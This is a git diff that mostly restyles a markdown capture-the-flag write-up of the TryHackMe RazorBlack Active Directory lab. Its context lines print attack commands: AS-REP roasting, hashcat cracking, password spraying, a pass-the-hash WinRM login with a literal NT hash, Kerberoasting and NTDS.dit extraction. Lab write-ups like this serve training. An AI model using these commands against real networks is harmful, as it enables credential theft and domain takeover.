@@ -4,9 +4,9 @@ tags:
   - Medium
   - Windows
   - AD
-  - Leakage
-  - Brute-Force
+  - Info-Disclosure
   - AS-REP
+  - Cracking
   - PtH
   - Kerberoasting
   - SeBackupPrivilege
@@ -157,7 +157,7 @@ sbradley
 
 # AS-REP
 
-Found user *twilliams* with **pre-authentication disabled**:
+Found user `twilliams` with **pre-authentication disabled**:
 
 ```console
 $ GetNPUsers.py raz0rblack.thm/ -request -outputfile TGTs.txt -usersfile users.txt -no-pass
@@ -168,7 +168,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:1e685f887f2cb2b4fdd958fc3002a359$d96998c7
 [-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-Cracked *twilliams* password:
+Cracked `twilliams` password:
 
 ```console
 $ hashcat -a 0 -m 18200 TGTs.txt /usr/share/dict/rockyou.txt 
@@ -179,7 +179,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:1e685f887f2cb2b4fdd958fc3002a359$d96998c7
 
 # Becoming lvetrova
 
-Found out that *sbradley* is being required to change his password on next logon, so we set it:
+Found out that `sbradley` is being required to change his password on next logon, so we set it:
 
 ```console
 $ nxc smb raz0rblack.thm -u users.txt -p 'roastpotatoes' --continue-on-success
@@ -282,7 +282,7 @@ SMB         10.66.144.101   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:
 ...
 ```
 
-Connect to the system via winRM as **lvetrova**:
+Connect to the system via winRM as `lvetrova`:
 
 ```console
 $ evil-winrm-py -i raz0rblack.thm -u 'lvetrova' -H 'f220d3988deb3f516c73f40ee16c431d'
@@ -313,7 +313,7 @@ PS> $cred.GetNetworkCredential().Password
 
 # Kerberoasting
 
-We just became **lvetrova** user because of TryHackMe's questions. In reality, after getting **twilliams** credentials, we could have gone to this step.
+We just became `lvetrova` user because of TryHackMe's questions. In reality, after getting `twilliams` credentials, we could have gone to this step.
 
 We request a Ticket Granting Service to perform a Kerberoasting attack and crack the hashes:
 
@@ -376,7 +376,7 @@ Since Windows expects carriage return (`\r\n`) in many files, we format the scri
 $ unix2dos back_script.txt
 ```
 
-From WinRM session, we upload the script and create a copy `NTDS.dit`:
+From Evil-WinRM session, we upload the script and create a copy `NTDS.dit`:
 ```console
 PS> mkdir C:\Windows\Temp\PrivEsc
 
@@ -457,7 +457,7 @@ Here is your Root Flag
 
 # Final Questions
 
-We are asked for **Tyson's flag**, which is essentially the **twilliams** user. So, we get into his directory, and find it:
+We are asked for **Tyson's flag**, which is essentially the `twilliams` user. So, we get into his directory, and find it:
 
 ```console
 PS> cd C:\Users\twilliams
@@ -495,4 +495,4 @@ PS> download top_secret.png top_secret.png
 ...
 ```
 
-The image is just a meme explaining the way to exit Vim. So the correct answer to the top secret is "**:wq**".
+The image is just a meme explaining the way to exit Vim. So the correct answer to the top secret is "`:wq`".
